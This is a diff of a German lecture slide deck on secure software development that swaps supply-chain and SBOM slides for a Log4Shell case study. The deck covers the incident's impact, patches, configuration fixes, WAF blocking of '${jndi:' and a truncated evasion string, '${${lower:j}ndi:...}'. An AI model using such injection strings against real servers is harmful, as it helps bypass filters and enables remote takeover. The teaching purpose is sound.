-# Supply Chain Angriffe
-## Und die Rolle der Software Bill of Materials (SBOM)
+**Schritt 5:** Log4j lädt die Klasse und **führt sie aus** → vollständige Kontrolle über den Server.
 
 ---
 
-# Was ist die Software Supply Chain?
+# Warum war es so verheerend?
 
-Moderne Software wird nicht mehr "auf der grünen Wiese" geschrieben. Sie ist ein Produkt aus:
-
-- **Proprietärem Code:** Eigenentwicklungen.
-- **Open Source Komponenten:** Bibliotheken (npm, PyPI, Maven).
-- **Build-Infrastruktur:** CI/CD-Pipelines, Compiler, Build-Server.
-- **Drittanbieter-Tools:** Cloud-Dienste, IDE-Plugins.
-
-> **Problem:** Ein Angreifer muss nicht Ihr Hauptquartier hacken, wenn er eine Bibliothek infizieren kann, die Sie (und tausende andere) blind vertrauen.
-
----
-
-# Angriffsflächen in der Supply Chain
-
-![w:700 center](img/supply_chain_attack_surface.svg)
+| Faktor | Auswirkung |
+| :--- | :--- |
+| **Einfachheit** | Keine komplexen Exploits nötig – ein einziger String reicht |
+| **Reichweite** | Von iCloud über Minecraft bis zu internen Bankensystemen |
+| **Blind Spots** | Viele Firmen wussten nicht, dass sie Log4j nutzen |
+| **Transitivität** | Log4j steckte oft 3-4 Ebenen tief im Dependency Tree |
+| **Nachgelagerte Systeme** | Ein Log-Eintrag wandert durch viele Systeme, bevor er "explodiert" |
 
 ---
 
-# Typische Angriffsvektoren
+# Mitigation: Wie wurde reagiert?
 
-- **Dependency Confusion:** Einschleusen von bösartigen Paketen mit gleichem Namen in öffentliche Repositories.
-- **Typosquatting:** Erstellen von Paketen wie `requesst` statt `requests`.
-- **Compromised Build Tools:** Manipulation des Build-Servers (z. B. Jenkins), um Backdoors während der Kompilierung einzufügen.
-- **Account Takeover:** Übernahme von Maintainer-Accounts auf GitHub oder npm.
+**1. Patch (langfristig):**
+- Update auf Log4j **Version 2.17.1** oder neuer.
+- JNDI-Lookups standardmäßig deaktiviert, Remote-Code-Laden entfernt.
 
----
-
-#  Die Lösung: Software Bill of Materials (SBOM)
-
-Eine **SBOM** ist eine formale, strukturierte Liste aller Komponenten, Bibliotheken und Module, die in einer Software verwendet werden.
-
-- **Wie eine Zutatenliste:** Vergleichbar mit den Inhaltsstoffen auf einer Lebensmittelverpackung.
-- **Transparenz:** Ermöglicht die schnelle Identifizierung von "giftigen" Bestandteilen (Schwachstellen).
-- **Vorgabe:** In vielen Sektoren (z. B. US-Behörden, kritische Infrastruktur) mittlerweile gesetzlich verpflichtend.
+**2. Konfiguration (Quick Fix):**
+- `log4j2.formatMsgNoLookups=true` – deaktiviert Lookups.
 
 ---
 
-#  Anatomie einer SBOM
+# Mitigation: Wie wurde reagiert?
 
-Eine effektive SBOM sollte folgende Fragen beantworten:
+**3. WAF-Regeln (sofort):**
+- Blockierung von Requests, die `${jndi:` enthalten.
+- Problem: Angreifer nutzen schnell Evasion-Techniken (z. B. `${${lower:j}ndi:...}`).
 
-- **Wer** hat die Komponente erstellt? (Author)
-- **Welche** Version wird genutzt? (Version)
-- **Woher** stammt sie? (Download URL / Repository)
-- **Abhängigkeiten:** Welche anderen Bibliotheken bringt diese Komponente mit? (Transitive Dependencies)
-- **Lizenz:** Unter welcher Lizenz steht der Code? (Compliance)
-
----
-
-#  Der SBOM-Lebenszyklus
-
-![w:600 center](img/sbom_lifecycle.svg)
+**4. SBOM-basierte Inventarisierung:**
+- Firmen mit SBOM konnten betroffene Systeme in Minuten identifizieren.
+- Firmen ohne SBOM brauchten Wochen.
 
 ---
 
-#  SBOM: Fazit & Best Practices
+# Log4Shell: Der SSDLC-Rückblick
 
-- **Vertraue nichts blind:** Jede `import`-Anweisung ist ein potenzielles Risiko.
-- **Automatisierung:** SBOMs müssen Teil der CI/CD-Pipeline sein (Security as Code).
-- **Vulnerability Scanning:** Tools wie *Trivy* oder *Snyk* nutzen SBOMs für präzise Scans.
-- **Lieferanten fordern:** Akzeptieren Sie keine Software von Drittanbietern ohne begleitende SBOM.
+| SSDLC-Phase | Hätte geholfen durch... |
+| :--- | :--- |
+| **Requirements** | "Logging darf keinen Remote Code laden" |
+| **Design** | Trust Boundary zwischen Logger und Netzwerk |
+| **Implementierung** | Secure Defaults – JNDI-Lookups standardmäßig deaktiviert |
+| **Testing (SCA)** | Verwundbare Log4j-Version in Abhängigkeiten erkannt |
+| **SBOM** | Alle betroffenen Systeme in Minuten identifiziert |
+| **DevSecOps** | Automatisierte SCA hätte bei jedem Build gewarnt |
+
+> **Keine einzelne Maßnahme hätte ausgereicht.** Der SSDLC als System bietet **Defense in Depth** – mehrere Schutzschichten, die sich ergänzen.
 
 ---
 <!-- _class: chapter -->
@@ -943,30 +946,30 @@ Eine effektive SBOM sollte folgende Fragen beantworten:
 
 ---
 
-# Zusammenfassung
+# Zusammenfassung: 10 Kernbotschaften
 
-- **SSDLC vs. SDLC:** Sicherheit ist kein Anhang, sondern integraler Kern.
-- **Shift Left:** Je früher ein Fehler gefunden wird, desto günstiger ist er.
-- **Planung:** Security Requirements, Abuse Cases, Compliance von Anfang an.
-- **Design:** Threat Modeling mit STRIDE ist das Standard-Vorgehen für Architekten.
-- **Implementierung:** OWASP Top 10 kennen – Injection, XSS, Broken Access Control.
-- **Testing:** SAST (Code), DAST (Laufzeit), SCA (Abhängigkeiten) – automatisiert in der Pipeline.
-- **Deployment:** Container-Hardening, IaC-Scanning, Secrets Management.
-- **Supply Chain:** Log4Shell zeigt – eine transitive Abhängigkeit kann alles kompromittieren.
-- **Governance:** OWASP SAMM, NIST SSDF, Microsoft SDL – Frameworks zur Reifegradmessung.
-- **Kultur:** Sicherheit ist die gemeinsame Verantwortung aller Beteiligten (DevSecOps).
+1. **SSDLC vs. SDLC:** Sicherheit ist kein Anhang, sondern integraler Kern.
+2. **Shift Left:** Je früher ein Fehler gefunden wird, desto günstiger.
+3. **Requirements:** Abuse Cases und Security DoD von Anfang an definieren.
+4. **Design:** Threat Modeling mit STRIDE ist das Standard-Vorgehen.
+5. **Implementierung:** OWASP Top 10 kennen – Injection, XSS, Broken Access Control.
+6. **Testing:** SAST + DAST + SCA – automatisiert in der Pipeline.
+7. **Supply Chain:** 80-90% Open-Source-Anteil – jede Abhängigkeit ist ein Risiko.
+8. **SBOM:** Die "Zutatenliste" macht Software transparent und auditierbar.
+9. **DevSecOps:** Security als Code – automatisiert, bei jedem Commit.
+10. **Log4Shell:** Zeigt, dass eine *transitive Abhängigkeit* alles kompromittieren kann.
 
 ---
 
 # Diskussionsfragen
 
-1. **Realität vs. Theorie:** In Ihrem Unternehmen wird ein kritisches Feature am Freitag um 17 Uhr fertig. Der SAST-Scan zeigt 3 "Medium"-Findings. Der Projektleiter sagt: "Wir shippen trotzdem." – Was tun Sie?
+1. **Realität vs. Theorie:** Ein kritisches Feature wird am Freitag um 17 Uhr fertig. Der SAST-Scan zeigt 3 "Medium"-Findings. Der Projektleiter sagt: *"Wir shippen trotzdem."* – Was tun Sie?
 
-2. **Verantwortung:** Ein Open-Source-Maintainer pflegt eine Library, die in tausenden Produkten steckt – unbezahlt, in seiner Freizeit. Ein Bug in seiner Library verursacht Millionenschäden. Wer trägt die Verantwortung?
+2. **Verantwortung:** Ein Open-Source-Maintainer pflegt eine Library, die in tausenden Produkten steckt – unbezahlt, in seiner Freizeit. Ein Bug verursacht Millionenschäden. Wer trägt die Verantwortung?
 
 3. **KI & SSDLC:** Wie verändert KI-generierter Code (GitHub Copilot, ChatGPT) den SSDLC? Brauchen wir neue Phasen oder Tools?
 
-4. **Trade-Off:** "100% Sicherheit ist unerreichbar." – Wie bestimmen Sie, wann ein Produkt "sicher genug" ist?
+4. **Kosten vs. Nutzen:** *"100% Sicherheit ist unerreichbar."* – Wie bestimmen Sie, wann ein Produkt "sicher genug" ist?
 
 ---
 
@@ -975,6 +978,6 @@ h1 { font-size: 60pt; }
 h2 { font-size: 40pt; }
 </style>
 
-# Und nächstes Mal..
+# Und nächstes Mal...
 
 ## Netzwerksicherheit
